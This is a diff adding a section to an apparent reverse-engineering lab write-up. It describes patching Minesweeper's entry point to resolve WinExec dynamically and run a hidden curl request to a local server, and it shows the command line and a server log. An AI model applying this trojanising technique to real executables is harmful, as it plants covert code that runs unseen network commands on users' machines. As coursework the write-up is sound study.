@@ -367,4 +367,62 @@ When running the modified winmine.exe, the game immediately jumps to our new sec
 
 <img width="98" height="101" alt="צילום מסך 2026-06-21 195040" src="https://github.com/user-attachments/assets/588d86b7-c39c-4468-bf0c-879ecd34a2df" />
 
+## Part D
+---
+The goal of this stage is to add code to the program that connects to a local HTTP server (127.0.0.1:80) and sends a message of my choice.
+
+**Setting Up the Local HTTP Server**
+
+Before writing any Assembly code, I needed an active receiver. A client cannot send a network request into thin air; a server must be listening on port 80, or the connection will instantly fail.
+
+To achieve this, I deployed a lightweight, built-in Python HTTP server via the command line:
+
+<img width="380" height="151" alt="image" src="https://github.com/user-attachments/assets/6a4c948e-46f7-412a-906c-6d859ff60c96" />
+
+This local server runs in the background and logs any incoming network traffic.
+
+#### What Were the Difficulties?
+
+**The Missing Function (WinExec):** To send the HTTP request easily, I chose to use the WinAPI function WinExec to run a stealthy background curl command (curl http://127.0.0.1:80/hacked). 
+
+However, when I checked the game's Import table in IDA, WinExec was missing. Because Minesweeper does not natively perform networking, I could not call this function directly.
+
+#### What Did I Do to Overcome Them?
+
+While analyzing the game’s imports, I noticed that two crucial system functions were available: 
+
+LoadLibraryA (at 0100109C) and GetProcAddress (at 01001094).
+
+I used LoadLibraryA to get the base handle of kernel32.dll, and then passed it along with the text string "WinExec" into GetProcAddress. This dynamically extracted the exact runtime memory pointer of WinExec into the EAX register, allowing me to execute it successfully without a direct import.
+
+<img width="522" height="203" alt="image" src="https://github.com/user-attachments/assets/6ea105b5-1f5c-48d8-8df4-128543f973ea" />
+
+To write the code and add the strings, I used the new section that I created back in Part C. At first, things got a bit messy because there was not enough room to add everything between the existing db data and the code. Therefore, I eventually decided to relocate the executable code to a different, clean address, which gave me plenty of space to add all the required data strings sequentially.
+
+All the new ASCII strings ("kernel32.dll", "WinExec", and the curl command) starting at 0102002A.
+
+<img width="573" height="161" alt="צילום מסך 2026-06-21 212236" src="https://github.com/user-attachments/assets/9ca87622-5fe2-4cd1-b236-cbfc2e6adfb8" />
+
+Then, I relocated the actual assembly logic deeper into the custom section at address 01020109. 
+
+<img width="586" height="268" alt="צילום מסך 2026-06-21 214834" src="https://github.com/user-attachments/assets/9ceca2f8-53b1-4f44-a4dc-7a3fc9dfff7d" />
+
+Finally, I updated my initial hijack hook inside the game's original start function to redirect the entry point directly to this new address (jmp 01020109h).
+
+<img width="521" height="137" alt="צילום מסך 2026-06-21 215819" src="https://github.com/user-attachments/assets/3d1e70ed-20f0-402a-861d-beb76452ae53" />
+
+### Result:
+
+When I execute the modified game while the local Python server is active, the program launches flawlessly. The custom "Hacked by BG" popup from Part C appears exactly as expected, and the game opens normally without crashing.
+
+Simultaneously, the Python server immediately captures and logs the network hit:
+
+<img width="581" height="290" alt="צילום מסך 2026-06-21 220213" src="https://github.com/user-attachments/assets/4b52f57b-5460-4807-9393-e0c55ea3ab66" />
+
+**Log Breakdown:**
+
+* 127.0.0.1: Confirms that an internal network connection originated directly from my local game client.
+* GET /hacked HTTP/1.1: Confirms that my dynamic assembly successfully fired the background curl command.
+* 404 (File Not Found): This response is completely correct and expected. The Python server structurally looks for a local file named hacked. Since it does not exist, it responds with a 404. My research milestone was fully met simply by proving that the client application was successfully forced to transmit data out to the network interface.
+
 
